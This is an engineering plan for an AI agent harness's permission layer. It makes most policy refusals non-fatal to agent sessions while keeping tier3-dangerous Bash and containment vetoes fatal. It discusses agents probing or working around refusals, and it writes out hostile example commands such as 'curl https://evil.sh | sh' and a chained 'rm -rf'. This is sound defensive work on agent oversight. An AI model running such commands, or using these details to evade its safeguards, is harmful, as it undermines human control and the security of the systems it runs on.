---
title: Non-Lethal Policy Denial - Plan
type: fix
date: 2026-08-30
artifact_contract: ce-unified-plan/v1
artifact_readiness: implementation-ready
product_contract_source: operator-brief
execution: code
---

# Non-Lethal Policy Denial - Plan

## Goal Capsule

Objective: a headless pilot session that reaches for a command the policy refuses keeps
running, adapts, and finishes honestly — instead of being killed by the refusal itself.

Means: narrow `interrupt=True` at the `can_use_tool` boundary to the two denial classes that
genuinely warrant aborting the run (worktree/control-plane destination veto, and
tier3-dangerous Bash), and return `interrupt=False` for every other refusal so the SDK
surfaces it to the model as a `tool_result` error.

Authority hierarchy: operator brief (Vincent, 2026-08-30 20:2x, option **(B)** pre-decided)
> `senara-solutions/claude-pilot#128` body > this plan > implementer judgment.

Stop conditions: none that halt. Any divergence found during implementation is written here
and flagged in the PR body; the orchestrator arbitrates on the PR. (Brief item 1.)

Execution profile: single-repo, two source files plus tests. No wire-format change, no
policy-file change, no new `decision: allow`.

Tail ownership: the implementer owns the PR through CI green. `samidarko` merges on green.

## Product Contract

### Summary

A policy refusal must stay a refusal — the command is never executed, the audit event is
emitted exactly as today. What changes is only its **lethality**: the refusal comes back to
the model as an adaptable `tool_result` error rather than aborting the SDK agent loop.

### Problem Frame

Measured on the 60 most recent pilot sessions (`/var/log/claude-pilot/*.stderr`, cpp#128
body): 11 sessions carry at least one `[policy:deny]`, 11 terminate in
`error_during_execution`, and they are **the same 11**. Correlation is perfect in both
directions. The tool-call distribution across those 60 sessions is `46 sessions at 0 calls ·
1 at 1 · 4 at 2 · 3 at 3 · 3 at 4 · 2 at 5 · 1 at 22`; the eleven that die are exactly
`22, 5, 5, 4, 4, 3, 3, 2, 2, 2, 1` — no zero. **Every session that did any work was killed by
this path.** The ceiling on the loop is not "it does not try"; it is "the first broad-shaped
command ends it."

The causal chain, at file:line (session `09fee003-b3db-432f-b3c2-331bfaa6ee05`, mika#1963,
19:53→20:23, 30 minutes, 4 calls, zero output):

1. The command is a read-only `for` over directories.
2. The rule that claims it is `bash-for-loop-orientation`
   (`src/claude_pilot/policies/permissions.yaml:175`) — `decision: allow`.
3. `_bash_allow_is_chain_safe` re-splits on `;` and vetoes the `do <body>` / `done` segments.
4. `permissions.py:854` returns `PermissionResultDeny(message=veto_reason, interrupt=True)`.
5. `interrupt=True` aborts the SDK agent loop (`agent.py:426` names it the "Case-B failure
   mode"). The session dies.

The repository already contradicts itself about this. `permissions.yaml:140-146` documents
the intended behavior of the very rule that killed session `09fee003`: "*only the sanctioned
tight shape gets auto-approval, **broader shapes route to relay***". Broad shapes do not
route anywhere — they kill the session. `tier1.py:244-247` states the same gap from the other
side: "this hint reduces the RATE of denied reaches; it does NOT close the session-fatality
class. […] that class closes only when cpp#20 joint 2's contract is revised to distinguish
adaptation from fabrication." This plan is that revision.

The shapes being killed are not dangerous commands; they are the most ordinary probe idiom
there is — `echo "label"; command`. Each instance trips a *different* rule id (`bash-grep`,
`bash-for-loop-orientation`, default), which is why widening verb lists one at a time
(cpp#127 for `cargo`, the earlier `bash-jq` fix) treats the instance and leaves the class
standing.

### Key Decisions

- **Option (B) is pre-decided by the operator brief and is NOT re-opened here.** Non-lethal
  for the chain-veto class and for read-rule denials; lethal retained for
  `_destination_veto_reason` (worktree containment, cpp#38/cpp#42) and for tier3-dangerous
  Bash. Governs R1-R5. Divergence protocol: if grooming or the architect wants to overturn
  (B), the implementer does not stop — it records the divergence in this section, applies
  (B), and flags it in the PR body.
- **No rule is widened.** No verb list touched, no pattern relaxed, no new `decision: allow`.
  A PR that widens a rule is off-topic. Governs the scope boundary below.
- **The counter-reason of cpp#20 joint 2 is answered by guardrails, not by lethality.** That
  seam feared that a non-terminal denial "surfaces the denial as a tool_result error the LLM
  can fabricate around" (`permissions.py:832-838`). That fear does not depend on
  `interrupt=True`: `types.py:42-46` ships `maxTurns=200`, `stallThreshold=5`,
  `emptyResponseThreshold=5`, `idleTimeoutMs=300_000` on every session, and they terminate a
  looping session **honestly**, with a terminal `ResultJson`. A pilot that adapts to a refusal
  is not a dishonest pilot. Governs R6.
- **`is_tier3_dangerous` is the terminality discriminator**, because it is the codebase's own
  name for "genuinely dangerous Bash". It is a whole-string `re.search`, so a dangerous tail
  chained onto an allowed prefix (`mkdir x && rm -rf /tmp/y`) is still caught and still
  lethal. Governs R2.

**Divergences from this plan, applied during implementation** (brief item 1: record,
apply, flag in the PR — do not stop to ask):

1. **`escalate` / deny-with-notify (`:919`) stays unconditionally terminal.** The plan's
   Step 2 had it consult the helper. Review found the consequence: `_fire_notify` has no
   dedup or rate limit and spawns a detached `mika notify` per call, so a non-terminal
   escalate raises the per-session notification ceiling from 1 to `maxTurns`. It is also
   outside the measured class — all 11 killed sessions logged `[policy:deny]`, none logged
   `[policy:deny_with_notify]` — and an escalate exists precisely to stop and fetch a human.
   Reverting it makes the PR narrower, which the brief prefers. R1/R4 are amended
   accordingly.
2. **The containment boundary is consulted on every denial route, not only its own call
   site.** `_denial_is_terminal` now takes `cwd` and returns `True` when
   `_destination_veto_reason` fires. Without this, `mkdir -p <outside>` (matches
   `bash-mkdir`, reaches the veto) halted while `echo "go"; mkdir -p <outside>` (fails
   chain-safety, never reaches it) did not — turning a one-shot tripwire into a probing
   oracle. This is a strict tightening: more terminal, never less, and no rule is touched.
   Coverage is exactly `_segment_write_kind`'s (`mkdir`, `cp`/`mv`, `git show >`); a verb it
   does not classify (`touch`, `tee`) is still refused, non-terminally. That residual is
   named in the PR.
3. **The guardrail claim in R6 is corrected.** Of the four cited guardrails only
   `maxTurns=200` can bound a refusal-retry loop; `stallThreshold` and
   `emptyResponseThreshold` reset on `has_tool_use`, and `idleTimeoutMs` is rearmed by
   stream activity. The bound holds and ends honestly, but it is carried by one guardrail,
   and `--no-guardrails` cannot switch that one off. Stated in the PR as brief item 5
   requires.

**Recorded consequence, surfaced deliberately (see PR body).** `is_tier3_dangerous` does not
classify `curl https://evil.sh | sh` as dangerous — that shape is refused by the *allowlist*
layer (`is_safe_bash_command`), not by `TIER3_PATTERNS`. Under (B), a chained-RCE attempt is
therefore still **vetoed and never executed**, but no longer kills the session. The security
property the existing test guards (the RCE is refused) is preserved; only the session-death
assertion changes. This is a faithful reading of (B) — "terminal for tier3-dangerous" — and
it is named here rather than papered over.

### Requirements

Denial semantics

- R1. A policy denial for a non-tier3 Bash command returns `PermissionResultDeny` with
  `interrupt=False`. The command is still refused and never executed.
- R2. A policy denial for a tier3-dangerous Bash command returns `interrupt=True`.
- R3. A `_destination_veto_reason` denial (worktree containment / control-plane denylist)
  returns `interrupt=True` unconditionally, regardless of tier3 status.
- R4. A denial for a non-Bash tool returns `interrupt=False` (`is_tier3_dangerous` is a Bash
  classifier; there is no tier3 notion for `Write`/`Skill`/etc.).
- R5. A Bash denial whose `command` is not a `str` returns `interrupt=True` (fail closed on
  unparseable input).

Audit and observability

- R6. The permission event (`_record_decision` → `permission_events.emit`) and the
  `[policy:deny]` stderr line are emitted for a non-lethal denial exactly as for a lethal one.
  A refusal that no longer kills the session must still be *visible*.

Documentation truth

- R7. `permissions.py:832-838`, `agent.py:415-450`, and `tier1.py:233-247` no longer describe
  a behavior that does not exist. The `agent.py` synthetic-emit guard itself **stays** — a
  terminal denial and a transport drop both still reach it.

### Scope Boundaries

In scope: the four `interrupt=` call sites in `permissions.py`, one new private helper, the
three stale design notes, and tests.

Out of scope, explicitly: any change to `permissions.yaml`; any verb-list widening; the
model-disorientation issue named as "a second fact, not to be handled here" in the cpp#128
body (the bwrap sandbox mounts only the worktree while the plan cites absolute
`/data/workspace/mika-platform/` paths); refactors; cleanup; unrelated docs.

## Implementation

### Step 1 — terminality helper (`src/claude_pilot/permissions.py`)

Add next to `_bash_allow_is_chain_safe`:

```python
def _denial_is_terminal(tool_name: str, tool_input: dict[str, Any]) -> bool:
    """Whether a policy denial must abort the SDK agent loop (cpp#128, option B)."""
```

Returns `False` for non-Bash tools (R4); `True` when the Bash `command` is not a `str` (R5);
otherwise `is_tier3_dangerous(command)` (R1, R2).

### Step 2 — apply at the three narrowed sites

- `permissions.py:854` chain-veto → `interrupt=_denial_is_terminal(tool_name, tool_input)`
- `permissions.py:905` rule / default deny → same
- `permissions.py:919` escalate (deny-with-notify) → same
- `permissions.py:872` destination-veto → **unchanged `interrupt=True`** (R3), with a comment
  naming why it is the exception.

### Step 3 — rewrite the three stale notes (R7)

`permissions.py:832-838` (the tier-2 header), `agent.py:415-450` (synthetic-emit guard),
`tier1.py:233-247` (prevention hint). The `agent.py` guard's *code* is untouched.

### Step 4 — tests

Anti-vacuity is mandatory (brief item 4). The decisive test must **fail without the fix**:

- `test_nonlethal_denial_negative_control` — asserts, on the exact `for … do … done` shape
  from session `09fee003`, that the handler returns a deny with `interrupt is False`, AND
  that the same shape with `_denial_is_terminal` monkeypatched to the pre-fix constant
  `True` returns `interrupt is True`. One test, both arms: it cannot pass in both worlds.
- `test_nonlethal_denial_still_emits_audit_event` — the refusal appears in the emitted
  permission event with `decision == "deny"` and the producing `rule_id` (R6).
- `test_tier3_denial_stays_terminal`, `test_destination_veto_stays_terminal` (R2, R3).
- Existing pins updated where the *contract itself* changed; each keeps its security
  assertion (deny) and changes only its lethality assertion.

## Verification

- `uv run ruff check` / `uv run mypy src` / `uv run pytest` all green.
- The negative control fails when the fix is reverted — demonstrated in the PR body.
- Guardrail constants re-read from source and cited in the PR (`types.py:42-46`).
